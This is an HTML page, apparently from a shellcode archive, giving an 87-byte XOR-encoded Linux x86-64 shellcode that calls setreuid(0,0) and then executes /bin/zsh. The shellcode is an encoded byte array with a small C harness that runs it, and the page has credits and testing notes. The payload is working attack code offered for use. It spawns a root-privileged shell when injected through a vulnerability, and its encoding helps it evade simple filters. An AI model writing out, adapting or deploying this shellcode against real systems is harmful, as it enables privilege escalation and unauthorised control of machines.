<html><head><title>Linux/x86-64 - Linux x86-64 setreuid (0,0) &amp; execve(/bin/zsh, [/bin/zsh, NULL]) + XOR encoded - 87 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86-64 setreuid (0,0) &amp; execve(&quot;/bin/zsh&quot;, [&quot;/bin/zsh&quot;, NULL]) + XOR encoded - 87 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer

unsigned char shellcode[] = 
&quot;\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb&quot;
&quot;\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48&quot;
&quot;\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc&quot;
&quot;\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74&quot;
&quot;\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4&quot;
&quot;\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54&quot;;                                     
int main(void) { ((void (*)())shellcode)(); }

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
